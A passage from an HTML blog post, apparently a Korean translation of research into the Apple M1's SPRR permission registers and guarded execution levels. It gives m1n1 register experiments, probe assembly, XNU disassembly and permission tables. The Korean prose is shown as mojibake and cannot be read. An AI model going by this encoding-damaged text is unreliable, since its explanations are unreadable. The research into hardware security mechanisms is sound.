class="hljs-number">15</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">5</span>, <span class="hljs-number">7</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">6</span>, <span class="hljs-number">4</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">6</span>, <span class="hljs-number">5</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">6</span>, <span class="hljs-number">6</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">14</span>, <span class="hljs-number">3</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">15</span>, <span class="hljs-number">5</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">15</span>, <span class="hljs-number">7</span>](<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>)  [<span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">2</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">2</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">9</span>, <span class="hljs-number">2</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">9</span>, <span class="hljs-number">3</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">9</span>, <span class="hljs-number">4</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">9</span>, <span class="hljs-number">5</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">9</span>, <span class="hljs-number">6</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">9</span>, <span class="hljs-number">7</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">0</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">1</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">12</span>, <span class="hljs-number">0</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">12</span>, <span class="hljs-number">1</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">15</span>, <span class="hljs-number">2</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">15</span>, <span class="hljs-number">3</span>]</code></pre></li></ul><p><code>S3_6_C15_C1_0</code>ë¥¼ <code>SPRR_CONFIG_EL1</code>ë¡œ ì¹­í•˜ì. ê·¸ ë ˆì§€ìŠ¤í„°ì˜ ë¹„íŠ¸ 1ì€ SPRRì„ í™œì„±í™”í•˜ê³  ëª¨ë“  ë¹„íŠ¸ë¥¼ ì„¤ì •í•œ í›„ ì¶”ê°€ì ì¸ ë³€ê²½ì„ ìœ„í•´ ëª¨ë“  SPRR ë ˆì§€ìŠ¤í„°ë¥¼ ì ê·¸ëŠ” ê²ƒìœ¼ë¡œ ë³´ì¸ë‹¤. <code>S3_6_C15_1_2</code>ê³¼ ê·¸ê²ƒì„ í™œì„±í™”í•˜ëŠ” ë ˆì§€ìŠ¤í„°ëŠ” íŒŒíŠ¸ 2ì—ì„œ ì¤‘ìš”í•˜ë‹¤.</p><p><code>S3_6_C15_C1_5</code>ì˜ ëª¨ë“  ë¹„íŠ¸ë¥¼ ìˆ˜ì •í•  ìˆ˜ ìˆë‹¤.</p><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>p.mmu_shutdown()TTY&gt; MMU: shutting down...TTY&gt; MMU: shutdown successful, clearing cache<span class="hljs-meta">&gt;&gt;&gt; </span>u.msr((<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>), <span class="hljs-number">1</span>)<span class="hljs-meta">&gt;&gt;&gt; </span>u.mrs((<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>))<span class="hljs-number">0x0</span><span class="hljs-meta">&gt;&gt;&gt; </span>u.msr((<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>), <span class="hljs-number">0xffffffffffffffff</span>)<span class="hljs-meta">&gt;&gt;&gt; </span>u.mrs((<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>))<span class="hljs-number">0xffffffffffffffff</span>&gt;&gt;&gt;</code></pre><p>ì´ ë ˆì§€ìŠ¤í„°ê°€ EL0ì— ì ìš©ë˜ëŠ” ê²ƒ ê°™ì§€ë§Œ, ì—¬ê¸°ì„œëŠ” EL2ì—ì„œ ì‹¤í–‰ëœë‹¤. ìƒˆë¡œ í™œì„±í™”ëœ ë ˆì§€ìŠ¤í„° <code>S3_6_C15_C1_6</code>ì€ EL1ì— ëŒ€í•œ ê²ƒì´ë©° <code>S3_6_C15_C1_7</code>ì€ EL2ì— ëŒ€í•œ ê²ƒì´ë¼ê³  ê°€ì •í•  ìˆ˜ ìˆë‹¤. M1ì€ í•­ìƒ <code>HCR_EL2.E2H</code>ë¡œ ì‹¤í–‰ë˜ë©° E1 ë ˆì§€ìŠ¤í„°ì— ëŒ€í•œ ì ‘ê·¼ì„ EL2 counterpartsë¡œ ë¦¬ë‹¤ì´ë ‰ì…˜ í•œë‹¤. ì´ë¥¼ ì‚¬ìš©í•˜ì—¬ ê°€ì •ì„ ì¦ëª…í•  ìˆ˜ ìˆë‹¤.</p><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>u.msr((<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>), <span class="hljs-number">0xdead0000</span>)<span class="hljs-meta">&gt;&gt;&gt; </span>u.mrs((<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">7</span>))<span class="hljs-number">0xdead0000</span>&gt;&gt;&gt;</code></pre><p>SPRRì„ ì´ì œ í™œì„±í™”í•  ìˆ˜ ìˆìœ¼ë©° EL2 ê¶Œí•œìœ¼ë¡œ ì‚¬ìš©ë˜ëŠ” ê²ƒ ê°™ì€ ë ˆì§€ìŠ¤í„°ë„ ìˆë‹¤. ì´ ë ˆì§€ìŠ¤í„°ì˜ 4 ë¹„íŠ¸ë¥¼ ì´í•´í•˜ê¸° ìœ„í•´ ìœ ì € ëœë“œì—ì„œ í•œ ì‹¤í—˜ì„ í•´ë³´ì.</p><h2 id="SPRR-ë¦¬ë²„ìŠ¤-ì—”ì§€ë‹ˆì–´ë§"><a href="#SPRR-ë¦¬ë²„ìŠ¤-ì—”ì§€ë‹ˆì–´ë§" class="headerlink" title="SPRR ë¦¬ë²„ìŠ¤ ì—”ì§€ë‹ˆì–´ë§"></a>SPRR ë¦¬ë²„ìŠ¤ ì—”ì§€ë‹ˆì–´ë§</h2><p>ê°„ë‹¨í•œ í˜ì´ì§€ í…Œì´ë¸”ì„ ì„¤ì •í•˜ê¸° ìœ„í•œ íŒŒì´ì¬ ì½”ë“œë¥¼ ì‘ì„±í•œ í›„ ìœ ì € ëœë“œì—ì„œ í–ˆë˜ ê²ƒê³¼ ë™ì¼í•˜ê²Œ ì‹¤í—˜í•  ìˆ˜ ìˆë‹¤. <code>S3_6_C15_C1_6</code>ì˜ ê¶Œí•œ ë°”ì´íŠ¸ë¥¼ í˜ì´ì§€ì— ë§¤í•‘í•˜ê³  í•´ë‹¹ í˜ì´ì§€ì—ì„œ ì½ê¸°, ì“°ê¸°, ì‹¤í–‰ì„ í•´ë³´ì.</p><p>íŒŒì´ì¬ì—ì„œ ì´ ì‘ì—…ì„ ì™„ë²½í•˜ê²Œ ìˆ˜í–‰í•˜ëŠ” ê²ƒì€ <code>r-x</code> í˜ì´ì§€ì—ì„œ ì‹¤í–‰ë˜ê³  ìŠ¤íƒì„ <code>rw-</code> í˜ì´ì§€ì— ìœ ì§€í•˜ê¸° ìœ„í•´ m1n1ì„ ë³€ê²½í•  ë•Œë§Œ ê°€ëŠ¥í•˜ë‹¤. íŒŒì´ì¬ì—ì„œ ê°€ëŠ¥í•œ ë§ì€ ì„¤ì • ì‘ì—…ì„ í•˜ê³  shellcodeë¥¼ ì‘ì„±í•˜ê³  ë‹¤ë¥¸ ì½”ì–´ì—ì„œ ì‹¤í–‰í•˜ëŠ” ê²ƒì´ í›¨ì”¬ ì‰½ë‹¤. í•˜ë‚˜ê°€ ì¤‘ë‹¨ë˜ë”ë¼ë„ ì¬ë¶€íŒ…ì´ ë˜ê¸° ì „ì— ë‹¤ë¥¸ ê²ƒì´ ë‚¨ì•„ìˆë‹¤.</p><pre><code class="hljs python">pagetable = ARMPageTable(heap.memalign, heap.free)pagetable.map(<span class="hljs-number">0x800000000</span>, <span class="hljs-number">0x800000000</span>, <span class="hljs-number">0xc00000000</span>, <span class="hljs-number">0</span>)   <span class="hljs-comment"># normal memory, we run from here</span>pagetable.map(<span class="hljs-number">0xf800000000</span>, <span class="hljs-number">0x800000000</span>, <span class="hljs-number">0xc00000000</span>, <span class="hljs-number">1</span>)  <span class="hljs-comment"># probe memory, we&#x27;ll try to read/write/execute this</span><span class="hljs-comment"># ...</span>code_page = build_and_write_code(heap, <span class="hljs-string">&quot;&quot;&quot;</span><span class="hljs-string">    // [...]</span><span class="hljs-string">                // prepare and enable MMU</span><span class="hljs-string">                ldr x0, =0x0400ff</span><span class="hljs-string">                msr MAIR_EL1, x0</span><span class="hljs-string">                ldr x0, =0x27510b510 // borrowed from m1n1&#x27;s MMU code</span><span class="hljs-string">                msr TCR_EL1, x0</span><span class="hljs-string">                ldr x0, =0x&#123;ttbr:x&#125;</span><span class="hljs-string">                msr TTBR0_EL1, x0</span><span class="hljs-string">                mrs x0, SCTLR_EL1</span><span class="hljs-string">                orr x1, x0, #5</span><span class="hljs-string">                msr SCTLR_EL1, x1</span><span class="hljs-string">                isb</span><span class="hljs-string">    // [...]</span><span class="hljs-string">&quot;&quot;&quot;</span>.format(ttbr=pagetable.l0)<span class="hljs-comment"># ...</span>ret = p.smp_call_sync(<span class="hljs-number">1</span>, code_page, sprr_val)<span class="hljs-comment"># ...</span></code></pre><p>signal handlerëŠ” ì´ì œ exception vectorê°€ ëœë‹¤. ë‹¨ì¼ ë ˆì§€ìŠ¤í„°ë¥¼ ìˆ˜ì •í•˜ì—¬ failureë¥¼ í‘œì‹œí•œ í›„ í”„ë¡œê·¸ë¨ ì¹´ìš´í„°ë¥¼ ë‘ ë²ˆ ì´ë™í•œ í›„ return í•œë‹¤. ì²« ë²ˆì§¸ ëª…ë ¹ì–´ëŠ” ë‹¤ì‹œ ì‹¤í–‰í•˜ê³  ì‹¶ì§€ ì•Šì€ ì˜ëª»ëœ ëª…ë ¹ì´ë‹¤. ë‘ ë²ˆì§¸ëŠ” <code>mov x10, 0x80</code>ìœ¼ë¡œ ì ‘ê·¼ì„ ì„±ê³µí–ˆìŒì„ í‘œì‹œí•˜ë©° ì˜ˆì™¸ê°€ ì²˜ë¦¬ë  ê²½ìš° í‘œì‹œë˜ì§€ ì•ŠëŠ”ë‹¤.</p><pre><code class="hljs python">_fault_handler:<span class="hljs-comment"># store that we failed</span>mov x10, <span class="hljs-number">0xf1</span>mrs x12, ELR_GL2  <span class="hljs-comment"># get the PC that faulted</span>add x12, x12, <span class="hljs-number">8</span>   <span class="hljs-comment"># skip two instructions</span>msr ELR_GL2, x12  <span class="hljs-comment"># store the updated PC</span>isb<span class="hljs-comment"># eret restores the state from before the exception was taken</span>eret_sprr_test:<span class="hljs-comment"># ...</span><span class="hljs-comment"># test read access, x1 contains an address to a page for which we modify the SPRR register values</span>mov x10, <span class="hljs-number">0</span>    <span class="hljs-comment"># x10 is our success/failure indicator</span>ldr x1, [x1]  <span class="hljs-comment"># this instruction will fault if we can&#x27;t read from [x1]</span>mov x10, <span class="hljs-number">0x80</span> <span class="hljs-comment"># this instruction will be skipped if the previous one faulted</span></code></pre><p>ëª¨ë“  16ê°œì˜ ê°€ëŠ¥í•œ ì„¤ì •ì„ ì–»ì„ ìˆ˜ ìˆë‹¤.</p><table><thead><tr><th>ë ˆì§€ìŠ¤í„° ê°’</th><th>í˜ì´ì§€ ê¶Œí•œ</th></tr></thead><tbody><tr><td>0000</td><td>â€”</td></tr><tr><td>0001</td><td>r-x</td></tr><tr><td>0010</td><td>râ€“</td></tr><tr><td>0011</td><td>rw-</td></tr><tr><td>0100</td><td>â€”</td></tr><tr><td>0101</td><td>r-x</td></tr><tr><td>0110</td><td>râ€“</td></tr><tr><td>0111</td><td>â€”</td></tr><tr><td>1000</td><td>â€”</td></tr><tr><td>1001</td><td>â€“x</td></tr><tr><td>1010</td><td>râ€“</td></tr><tr><td>1011</td><td>rw-</td></tr><tr><td>1100</td><td>â€”</td></tr><tr><td>1101</td><td>r-x</td></tr><tr><td>1110</td><td>râ€“</td></tr><tr><td>1111</td><td>rw-</td></tr></tbody></table><p>ì—¬ê¸°ì— ì´ìƒí•œ ì ì´ ì¡´ì¬í•˜ëŠ”ë°, ëŒ€ë¶€ë¶„ í•˜ìœ„ ë‘ ë¹„íŠ¸ê°€ ê¶Œí•œì„ ì§€ì •í•œë‹¤. ê·¸ëŸ¬ë‚˜ ë†’ì€ ë¹„íŠ¸ê°€ ê¶Œí•œì„ ë³€ê²½í•˜ëŠ” ë‘ ê°€ì§€ ì˜ˆì™¸ê°€ ì¡´ì¬í•œë‹¤. <code>0111</code>ì˜ ê²½ìš° <code>rw-</code>ê°€ ì•„ë‹Œ <code>---</code> ê¶Œí•œì„ ê°€ì§€ê³ , <code>1001</code>ì˜ ê²½ìš° <code>r-x</code>ê°€ ì•„ë‹Œ <code>r</code> ê¶Œí•œë§Œì„ ê°€ì§„ë‹¤.</p><p>ì´ë¥¼ ì¸ì½”ë”©í•˜ëŠ”ë° ë‘ ê°œì˜ ë¹„íŠ¸ê°€ ë” ë‚­ë¹„ë  í•„ìš”ê°€ ì—†ë‹¤. ì´ê²ƒì€ ì²˜ìŒì— ì“°ê¸°, ì‹¤í–‰ ê¶Œí•œì„ ì—„ê²©í•˜ê²Œ ì‹œí–‰í•˜ëŠ” ìœ ì € vs ì»¤ë„ ê¶Œí•œìœ¼ë¡œ ë³´ì¸ë‹¤. í•˜ì§€ë§Œ EL0ì€ ë‹¤ë¥¸ ë ˆì§€ìŠ¤í„°ë¥¼ ì‚¬ìš©í•˜ëŠ” ê²ƒì„ ì•Œê³  ìˆë‹¤. ê·¸ëŸ¼ ì–˜ëŠ” ë­˜ê¹Œ?</p><h1 id="Guarded-Exception-Levels-GXF"><a href="#Guarded-Exception-Levels-GXF" class="headerlink" title="Guarded Exception Levels / GXF"></a>Guarded Exception Levels / GXF</h1><p>ìœ„ì—ì„œ PPR ë ˆì§€ìŠ¤í„°ì— ì¸ì½”ë”© ëœ ì•½ê°„ ì´ìƒí•œ ì ì„ ë°œê²¬í–ˆë‹¤. normal exception levelsê³¼ëŠ” ë‹¤ë¥¸ <a href="https://twitter.com/s1guza/status/1353749746951839748">guarded exception levels</a>ì— ëŒ€í•œ <a href="https://twitter.com/qwertyoruiopz/status/1174787964100075521">ëª‡ ê°€ì§€</a> <a href="https://twitter.com/s1guza/status/1355929535699681284">ì–¸ê¸‰</a>ì´ ìˆë‹¤. ì´ê²ƒì€ ì»¤ìŠ¤í…€ ëª…ë ¹ì–´ <code>0x00201420</code>ê³¼ <code>0x00201400</code>(<code>genter</code>, <code>gexit</code>)ì„ í†µí•´ íŠ¸ë¦¬ê±° ëœë‹¤.</p><p>disassemblerë¡œ XNUë¥¼ ê°€ì ¸ê°€ì„œ, <code>otool -xv /System/Library/Kernels/kernel.release.t8101</code>ì„ ì‚¬ìš©í•˜ì—¬ ì‚´í´ë³´ì.</p><pre><code class="hljs apache"><span class="hljs-attribute">fffffe00071f80f0</span>        mov     x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">1</span><span class="hljs-attribute">fffffe00071f80f4</span>        msr     S<span class="hljs-number">3</span>_<span class="hljs-number">6</span>_C<span class="hljs-number">15</span>_C<span class="hljs-number">1</span>_<span class="hljs-number">2</span>, x<span class="hljs-number">0</span><span class="hljs-attribute">fffffe00071f80f8</span>        adrp    x<span class="hljs-number">0</span>, <span class="hljs-number">2025</span> ; <span class="hljs-number">0</span>xfffffe<span class="hljs-number">00079</span>e<span class="hljs-number">1000</span><span class="hljs-attribute">fffffe00071f80fc</span>        add     x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">9</span>d<span class="hljs-number">8</span><span class="hljs-attribute">fffffe00071f8100</span>        msr     S<span class="hljs-number">3</span>_<span class="hljs-number">6</span>_C<span class="hljs-number">15</span>_C<span class="hljs-number">8</span>_<span class="hljs-number">2</span>, x<span class="hljs-number">0</span><span class="hljs-attribute">fffffe00071f8104</span>        adrp    x<span class="hljs-number">0</span>, <span class="hljs-number">2025</span> ; <span class="hljs-number">0</span>xfffffe<span class="hljs-number">00079</span>e<span class="hljs-number">1000</span><span class="hljs-attribute">fffffe00071f8108</span>        add     x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">9</span>dc<span class="hljs-attribute">fffffe00071f810c</span>        msr     S<span class="hljs-number">3</span>_<span class="hljs-number">6</span>_C<span class="hljs-number">15</span>_C<span class="hljs-number">8</span>_<span class="hljs-number">1</span>, x<span class="hljs-number">0</span><span class="hljs-attribute">fffffe00071f8110</span>        isb<span class="hljs-attribute">fffffe00071f8114</span>        mov     x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">0</span><span class="hljs-attribute">fffffe00071f8118</span>        msr     ELR_EL<span class="hljs-number">1</span>, x<span class="hljs-number">0</span><span class="hljs-attribute">fffffe00071f811c</span>        isb<span class="hljs-attribute">fffffe00071f8120</span>        .long   <span class="hljs-number">0</span>x<span class="hljs-number">00201420</span><span class="hljs-attribute">fffffe00071f8124</span>        ret</code></pre><p>ì´ì „ì— ì°¾ì€ ë‘ ë²ˆì§¸ í™œì„±í™” ë ˆì§€ìŠ¤í„° <code>S3_6_C15_C1_2</code>ë¥¼ ì²˜ìŒ ì‚¬ìš©í•œ í›„ ì•Œ ìˆ˜ ì—†ëŠ” ì‹œìŠ¤í…œ ë ˆì§€ìŠ¤í„°ì— ë‘ ê°œì˜ í¬ì¸í„°ë¥¼ ì‘ì„±í•˜ê³  <code>0x00201420</code>ì„ ì‹¤í–‰í•œë‹¤. ì²« ë²ˆì§¸ í¬ì¸í„°ëŠ” ë¬´í•œ ë£¨í”„ì´ì§€ë§Œ ë‘ ë²ˆì§¸ í¬ì¸í„°ëŠ” ì´ì „ì— í™•ì¸í•œ SPRR ë ˆì§€ìŠ¤í„°ë„ ì‚¬ìš©í•˜ëŠ” ê²ƒìœ¼ë¡œ ì¶”ì¸¡ë˜ëŠ” í•¨ìˆ˜ë¥¼ ê°€ë¦¬í‚¨ë‹¤.</p><p>ì•„ë§ˆë„ <code>S3_6_C15_C8_1</code>ì— <code>0x00201420</code>ì´ ì‹¤í–‰ë˜ë©´ í”„ë¡œì„¸ìŠ¤ê°€ ì í”„í•˜ëŠ” í¬ì¸í„°ê°€ í¬í•¨ë˜ë©° <code>0x00201420</code>ëŠ” EL3ì— íŠ¸ë©í•˜ëŠ” <code>smc</code>ì´ê³ , <code>0x00201400</code>ì€ EL2ë¡œ ëŒì•„ê°€ëŠ” <code>eret</code>ì¸ í•˜ì´í¼ë°”ì´ì € í˜¸ì¶œ ë°©ì‹ê³¼ ìœ ì‚¬í•˜ë‹¤. ìƒˆë¡œìš´ ì‹¤í–‰ ëª¨ë“œì— ëŒ€í•œ ë‹¤ë¥¸ í˜ì´ì§€ í…Œì´ë¸”ì´ ì—†ëŠ” ê²ƒì´ ì°¨ì´ì ì´ë‹¤. SPRR ë ˆì§€ìŠ¤í„°ì— ì•Œë ¤ì§€ì§€ ì•Šì€ 2 ë¹„íŠ¸ê°€ GL2ì˜ í˜ì´ì§€ ê¶Œí•œì´ë©´ ì–´ë–¨ê¹Œ?</p><p>ì´ì „ê³¼ ê°™ì€ ì ‘ê·¼ë²•ì„ ì‚¬ìš©í•˜ì—¬ m1n1ì—ì„œ ë‹¤ì‹œ ê²€ì¦ì„ í•´ë³´ì•˜ë‹¤. guarded excution modeì— exception vectorë¥¼ ì„¤ì •í•˜ê³  ê°™ì€ ì‹¤í—˜ì„ ë°˜ë³µí•˜ì.</p><p><code>VBAR</code>ë¼ ë¶ˆë¦¬ëŠ” ë ˆì§€ìŠ¤í„°ë¥¼ í˜¸ì¶œí•˜ì—¬ ìƒˆë¡œìš´ ëª¨ë“œì—ì„œ exception vectorë¥¼ ì„¤ì •í•  ìˆ˜ ìˆë‹¤. <code>genter</code> ì´í›„ XNUê°€ ì„¤ì •í•˜ëŠ” ì²« ë ˆì§€ìŠ¤í„° ì¤‘ í•˜ë‚˜ì¸ <code>S3_6_C15_C10_2</code>ê°€ ê°€ë¦¬í‚¤ëŠ” ì½”ë“œë¥¼ ì‚´í´ë³´ì.</p><pre><code class="hljs"><span class="hljs-attribute">fffffe00079e0000</span>        b       <span class="hljs-number">0</span>xfffffe<span class="hljs-number">00079</span>e<span class="hljs-number">15</span>d<span class="hljs-number">0</span><span class="hljs-attribute">fffffe00079e0004</span>        nop<span class="hljs-attribute">fffffe00079e0008</span>        nop<span class="hljs-attribute">fffffe00079e000c</span>        nop[...]<span class="hljs-attribute">fffffe00079e007c</span>        nop<span class="hljs-attribute">fffffe00079e0080</span>        b       <span class="hljs-number">0</span>xfffffe<span class="hljs-number">00079</span>e<span class="hljs-number">1000</span><span class="hljs-attribute">fffffe00079e0084</span>        nop[...]<span class="hljs-attribute">fffffe00079e00fc</span>        nop<span class="hljs-attribute">fffffe00079e0100</span>        b       <span class="hljs-number">0</span>xfffffe<span class="hljs-number">00079</span>e<span class="hljs-number">11</span>f<span class="hljs-number">0</span><span class="hljs-attribute">fffffe00079e0104</span>        nop[...]</code></pre><p><code>S3_6_C15_C10_2</code>ê°€ <code>VBAR_GL1</code>ì„ì„ ì˜ë¯¸í•˜ëŠ” ì˜ˆì™¸ ë²¡í„° í…Œì´ë¸”ë¡œ ë³´ì¸ë‹¤.</p><p>ì´ê²ƒì€ ì „ì²´ ê¶Œí•œ í…Œì´ë¸”ì„ ì°¾ëŠ”ë°ì— ë™ì‘í•œë‹¤. SPRR ë ˆì§€ìŠ¤í„°ì˜ ê°’ì´ <code>0100</code>, <code>0110</code> í˜¹ì€ <code>1111</code>ì¸ ë™ì•ˆì— EL2ì—ì„œ ì½”ë“œë¡œ ì í”„í•  ë•Œ í¬ë˜ì‹œê°€ ë‚œë‹¤. ì´ ëª¨ë“  ê°’ë“¤ì€ EL2ì—ì„œ  ì‹¤í–‰í•  ìˆ˜ ì—†ì§€ë§Œ GL2ì—ì„œëŠ” ê°€ëŠ¥í•œ í˜ì´ì§€ë¥¼ ë‚˜íƒ€ë‚¸ë‹¤. ì´ëŸ¬í•œ ê²°í•¨ì€ ëª‡ ê°€ì§€ ì´ìœ ë¡œ ì¸í•´ ë‹¤ë¥¸ ì£¼ì†Œë¡œ ì§€ì •ë˜ë©´ ì–´ë–»ê²Œ ë ê¹Œ? ì„¸ ê°€ì§€ ê²°í•¨ì€ XNUì— ë¬´í•œ ë£¨í”„ë¥¼ ê°€ë¦¬í‚¤ëŠ” ì‹œìŠ¤í…œ ë ˆì§€ìŠ¤í„°ë¥¼ ì‚¬ìš©í•œë‹¤.</p><ul><li>EL2ê°€ GL2ì—ì„œë§Œ ì‹¤í–‰ ê°€ëŠ¥í•œ ì½”ë“œë¡œ ì í”„í•˜ëŠ” ê²½ìš° <code>S3_6_C15_C8_2</code>ë¡œ ì´ë™(<code>GXF_ABORT_EL2</code>)</li><li>EL2ì—ì„œì˜ ë‹¤ë¥¸ ì¤‘ë‹¨ì€ <code>VBAR_EL2</code>ë¡œ ì´ë™</li><li>GL2ì—ì„œì˜ ë‹¤ë¥¸ ì¤‘ë‹¨ì€ <code>VBAR_GL2</code>ë¡œ ì´ë™</li></ul><p>ì´ì œ SPRR ë ˆì§€ìŠ¤í„°ì˜ ëª¨ë“  ë¹„íŠ¸ê°€ ì „ì²´ ê¶Œí•œ í…Œì´ë¸”ë¡œ ì´ì–´ì§ì„ ì•Œì•˜ë‹¤.</p><table><thead><tr><th>ë ˆì§€ìŠ¤í„° ê°’</th><th>EL í˜ì´ì§€ ê¶Œí•œ</th><th>GL í˜ì´ì§€ ê¶Œí•œ</th></tr></thead><tbody><tr><td>0</td><td><code>---</code></td><td><code>---</code></td></tr><tr><td>1</td><td><code>r-x</code></td><td><code>---</code></td></tr><tr><td>10</td><td><code>r--</code></td><td><code>---</code></td></tr><tr><td>11</td><td><code>rw-</code></td><td><code>---</code></td></tr><tr><td>100</td><td><code>---</code></td><td><code>r-x</code></td></tr><tr><td>101</td><td><code>r-x</code></td><td><code>r-x</code></td></tr><tr><td>110</td><td><code>r--</code></td><td><code>r-x</code></td></tr><tr><td>111</td><td><code>---</code></td><td><code>r-x</code></td></tr><tr><td>1000</td><td><code>---</code></td><td><code>r--</code></td></tr><tr><td>1001</td><td><code>--x</code></td><td><code>r--</code></td></tr><tr><td>1010</td><td><code>r--</code></td><td><code>r--</code></td></tr><tr><td>1011</td><td><code>rw-</code></td><td><code>r--</code></td></tr><tr><td>1100</td><td><code>---</code></td><td><code>rw-</code></td></tr><tr><td>1101</td><td><code>r-x</code></td><td><code>rw-</code></td></tr><tr><td>1110</td><td><code>r--</code></td><td><code>rw-</code></td></tr><tr><td>1111</td><td><code>rw-</code></td><td><code>rw-</code></td></tr></tbody></table><p>GL ê¶Œí•œ ë¹„íŠ¸ê°€ EL ê¶Œí•œ ë¹„íŠ¸ì˜ ì˜ë¯¸ë¥¼ ìˆ˜ì •í•˜ëŠ” ë‘ ê°€ì§€ íŠ¹ë³„í•œ ê²½ìš°ë¥¼ ì‚´í´ë³´ì.</p><ul><li><code>0111</code>ì€ GLì—ì„œ ì‹¤í–‰ì´ ê°€ëŠ¥í•˜ë©° ELì—ì„œ ì“°ê¸°ê°€ ê°€ëŠ¥í•œ í˜ì´ì§€ë¥¼ ë§Œë“¤ ìˆ˜ ì—†ë‹¤. ì†Œí”„íŠ¸ì›¨ì–´ ì˜¤ë¥˜ì— ëŒ€í•œ ì¶”ê°€ì ì¸ í•˜ë“œì›¨ì–´ ê³„ì¸µ ë³´í˜¸ ê¸°ëŠ¥ì„ ì œê³µí•œë‹¤. ELì—ì„œ GLë¡œ ì‹¤í–‰ ì¤‘ì¸ ì½”ë“œë¥¼ ë³€ê²½í•  ìˆ˜ ìˆëŠ” ê²ƒì€ ì „ì²´ì ì¸ lateral levelì„ ë¬´ì˜ë¯¸í•˜ê²Œ ë§Œë“ ë‹¤.</li><li><code>1001</code>ì€ í˜ì´ì§€ê°€ GLì—ì„œë§Œ ì½ì„ ìˆ˜ ìˆì„ ë•Œ <code>r-x</code> 